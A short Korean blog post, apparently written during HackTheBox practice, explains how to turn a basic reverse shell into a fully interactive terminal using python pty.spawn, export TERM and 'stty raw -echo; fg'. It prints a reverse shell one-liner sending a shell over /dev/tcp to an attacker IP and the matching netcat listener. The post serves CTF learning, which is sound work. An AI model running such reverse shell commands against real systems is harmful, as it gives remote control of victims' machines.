---
title: Shell Terminal 입출력 연결
categories: [ETC., Tools]
tags: [shell, pytho, pty, reverseshell]
image:
    path: /assets/image_post/20240228155410.png
---

htb 문제 풀이 중 shell 연결 시 화살표 입력, 자동 완성 등이 입력되지 않고 `]A` 와 같은 형태로 입력되어 다소 불편함이 존재한다. 이를 해결하는 방법을 찾아 공유한다.


보통 문제 풀이 중 아래와 같이 bash shell을 연결하는 경우가 필요하다.
``` bash
os-shell> bash -c 'sh -i >& /dev/tcp/10.10.14.175/443 0>&1'
```

해당 방식으로 reverse shell 연결 시 아래와 같이 `$`가 나타나며 명령어 입력이 가능하지만, 화살표와 같은 상호작용 입력을 줄 경우 아래와 같이 나타난다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.175] from (UNKNOWN) [10.129.95.174] 51146
sh: 0: can't access tty; job control turned off
$ ^[[A^[[A
```

> *pty.spawn(argv[, master_read[, stdin_read]])* </br> 프로세스를 스폰하고, 그것의 제어 터미널을 현재 프로세스의 표준 입출력과 연결합니다. 이것은 종종 제어 터미널에서 읽으려고 하는 프로그램을 조절하는 데 사용됩니다

아래와 같이 python으로 pty를 활성화 할 경우 기존과 다르게 쉘에 유저명 및 경로 등이 나타나게 된다. 다만, 해당 방식으로 적용하더라도 화살표 입력 등은 되지 않으며, 두번째와 같이 export TERM이 필요하다.
``` bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
postgres@vaccine:/var/lib/postgresql$
postgres@vaccine:/var/lib/postgresql$ ^[[A^[[A

postgres@vaccine:/var/lib/postgresql$ export TERM=xterm
export TERM=xterm
```

마지막으로 가장 중요한 단계인 `Ctrl+Z`로 연결을 한번 끊어야 한다. 연결을 끊더라도 바로 재연결이 가능하기에, 우선 끊어야 한다.
``` bash
postgres@vaccine:/var/lib/postgresql$ ^Z
zsh: suspended  nc -lnvp 443
```
위에서 연결을 끊었다면 이제 아래와 같이 `stty raw -echo ; fg`를 입력해주면 된다. 그렇다면 이전의 연결이 자동으로 이루어지며, 화살표 입력도 가능해진다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# stty raw -echo ; fg
[15]    continued  nc -lnvp 443

postgres@vaccine:/var/lib/postgresql$
```

참고 링크
> https://medium.com/@aniketdas07770/hackthebox-vaccine-writeup-f5e19028a3fa